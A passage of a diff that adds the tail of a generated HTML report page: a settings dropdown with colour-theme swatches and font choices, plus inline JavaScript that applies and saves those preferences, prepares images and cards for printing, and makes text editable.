+    <div class="hf-swatches"><button type="button" class="hf-swatch active" data-theme-id="ikb" data-scheme="light" style="background:linear-gradient(135deg,#fafaf8 0 50%,#002FA7 50% 100%)" title="克莱因蓝 IKB" aria-label="克莱因蓝"></button><button type="button" class="hf-swatch" data-theme-id="lemon" data-scheme="light" style="background:linear-gradient(135deg,#fafaf8 0 50%,#FFD500 50% 100%)" title="柠檬黄 Lemon" aria-label="柠檬黄"></button><button type="button" class="hf-swatch" data-theme-id="lemon-green" data-scheme="light" style="background:linear-gradient(135deg,#fafaf8 0 50%,#C5E803 50% 100%)" title="柠檬绿 Lemon Green" aria-label="柠檬绿"></button><button type="button" class="hf-swatch" data-theme-id="safety-orange" data-scheme="light" style="background:linear-gradient(135deg,#fafaf8 0 50%,#FF6B35 50% 100%)" title="安全橙 Safety Orange" aria-label="安全橙"></button></div>
+    <div class="hf-dropdown-divider"></div>
+    <div class="hf-dropdown-label">字体</div>
+    <div class="hf-font-options"><button type="button" class="hf-font-option active" data-vars="--font-sans --font-display" data-family="'Inter','Noto Sans SC','PingFang SC','Hiragino Sans GB','Microsoft YaHei',system-ui,sans-serif" data-href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&amp;display=swap"><span class="font-preview" style="font-family:'Inter','Noto Sans SC','PingFang SC','Hiragino Sans GB','Microsoft YaHei',system-ui,sans-serif">黑体 Aa</span><span class="font-name">Inter</span></button><button type="button" class="hf-font-option" data-vars="--font-sans --font-display" data-family="'DM Sans','Noto Sans SC','PingFang SC','Hiragino Sans GB','Microsoft YaHei',system-ui,sans-serif" data-href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@100..1000&amp;display=swap"><span class="font-preview" style="font-family:'DM Sans','Noto Sans SC','PingFang SC','Hiragino Sans GB','Microsoft YaHei',system-ui,sans-serif">黑体 Aa</span><span class="font-name">DM Sans</span></button><button type="button" class="hf-font-option" data-vars="--font-sans --font-display" data-family="'Space Grotesk','Noto Sans SC','PingFang SC','Hiragino Sans GB','Microsoft YaHei',system-ui,sans-serif" data-href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300..700&amp;display=swap"><span class="font-preview" style="font-family:'Space Grotesk','Noto Sans SC','PingFang SC','Hiragino Sans GB','Microsoft YaHei',system-ui,sans-serif">黑体 Aa</span><span class="font-name">Space Grotesk</span></button></div>
+  </div>
+</div>
+<script>(function () {
+  'use strict';
+
+  // Theme options live in assets/themes.json; render.mjs writes the controls
+  // into the HTML statically, so this file only wires up behaviour.
+  const style = document.documentElement.dataset.hfStyle || 'swiss';
+  const $ = (id) => document.getElementById(id);
+  // Per page: a reader's choice on one page (or a brand page's palette) doesn't leak into other pages
+  const STORE = 'hf-page-prefs:' + style + ':' + location.pathname;
+
+  // ── Helpers ──
+  function closeAllDropdowns() {
+    document.querySelectorAll('.hf-dropdown.open').forEach(d => d.classList.remove('open'));
+  }
+
+  document.addEventListener('click', (e) => {
+    if (!e.target.closest('.hf-dropdown') && !e.target.closest('.hf-fab-btn')) {
+      closeAllDropdowns();
+    }
+  });
+
+  // PDF / long-image export is no longer in the page: the model runs scripts/export.mjs.
+
+  document.getElementById('hf-settings-toggle').addEventListener('click', (e) => {
+    e.stopPropagation();
+    const dd = document.getElementById('hf-settings-dropdown');
+    const wasOpen = dd.classList.contains('open');
+    closeAllDropdowns();
+    if (!wasOpen) dd.classList.add('open');
+  });
+
+  // ── Theme switching ──
+  // Every palette is a [data-theme] block in the inlined design-system CSS; a swatch only
+  // switches <html data-theme>. Text, rule and accent-text colours come with the theme,
+  // contrast-checked, so nothing is set inline.
+  function applyTheme(sw) {
+    document.querySelectorAll('.hf-swatch').forEach(s => s.classList.toggle('active', s === sw));
+    const root = document.documentElement;
+    root.dataset.theme = sw.dataset.themeId;
+    root.dataset.scheme = sw.dataset.scheme || 'light';
+    root.style.colorScheme = root.dataset.scheme;
+  }
+  // ── Font switching ──
+  // An option swaps the Latin face of the body stack (the CJK face stays); its stylesheet
+  // is loaded on first use.
+  function applyFont(opt) {
+    document.querySelectorAll('.hf-font-option').forEach(o => o.classList.toggle('active', o === opt));
+    (opt.dataset.vars || '--font-sans').split(' ').forEach(v => document.documentElement.style.setProperty(v, opt.dataset.family));
+    const href = opt.dataset.href;
+    if (href && !document.querySelector(`link[data-hf-font="${href}"]`)) {
+      const link = document.createElement('link');
+      link.rel = 'stylesheet';
+      link.dataset.hfFont = href;
+      link.href = href;
+      document.head.appendChild(link);
+    }
+  }
+  function save() {
+    try {
+      const sw = document.querySelector('.hf-swatch.active');
+      const fo = document.querySelector('.hf-font-option.active');
+      localStorage.setItem(STORE, JSON.stringify({ theme: sw && sw.dataset.themeId, font: fo && fo.dataset.family }));
+    } catch (e) {}
+  }
+  document.querySelectorAll('.hf-swatch').forEach(sw => sw.addEventListener('click', (e) => { e.stopPropagation(); applyTheme(sw); save(); }));
+  document.querySelectorAll('.hf-font-option').forEach(opt => opt.addEventListener('click', (e) => { e.stopPropagation(); applyFont(opt); save(); }));
+  try {
+    const prefs = JSON.parse(localStorage.getItem(STORE) || 'null');
+    if (prefs) {
+      const sw = [...document.querySelectorAll('.hf-swatch')].find(s => s.dataset.themeId === prefs.theme);
+      if (sw && !sw.classList.contains('active')) applyTheme(sw);
+      const fo = [...document.querySelectorAll('.hf-font-option')].find(o => o.dataset.family === prefs.font);
+      if (fo && !fo.classList.contains('active')) applyFont(fo);
+    }
+  } catch (e) {}
+
+  // ── Make lazy images print/export-safe ──
+  // loading="lazy" images below the fold are blank in PDF/long-image exports.
+  function eagerImages() { document.querySelectorAll('img[loading="lazy"]').forEach(i => { i.loading = 'eager'; }); }
+  window.addEventListener('beforeprint', eagerImages);
+  if (document.readyState === 'complete') setTimeout(eagerImages, 800);
+  else window.addEventListener('load', () => setTimeout(eagerImages, 800));
+
+  // ── Editable text ──
+  const editableSelectors = [
+    '.hero h1',
+    '.hero-subtitle',
+    '.hero-cover h1',
+    '.hero-cover .hero-subtitle',
+    '.section h2',
+    '.section h3',
+    '.section p',
+    '.section li',
+    '.pullquote p',
+    '.pullquote-swiss .pq-content p',
+    '.highlight-card p',
+    '.highlight-swiss .hl-body p',
+    '.def-card-body',
+    '.def-card-swiss .dc-body',
+    '.process-title',
+    '.process-desc',
+    '.aside-content p',
+    '.summary-item-title',
+    '.summary-item-desc',
+    'blockquote p',
+    'td',
+  ];
+  editableSelectors.forEach(sel => {
+    document.querySelectorAll(sel).forEach(el => {
+      el.setAttribute('contenteditable', 'true');
+      el.setAttribute('spellcheck', 'false');
+    });
+  });
+})();
+</script>
+<script id="pm-script">
+(function(){
+  var cards=function(){return document.querySelectorAll('details.pm-card')};
+  window.addEventListener('beforeprint',function(){cards().forEach(function(d){d.dataset.was=d.open?'1':'0';d.open=true})});
+  window.addEventListener('afterprint',function(){cards().forEach(function(d){d.open=d.dataset.was==='1'})});
+})();
+</script>
+</body>
+</html>
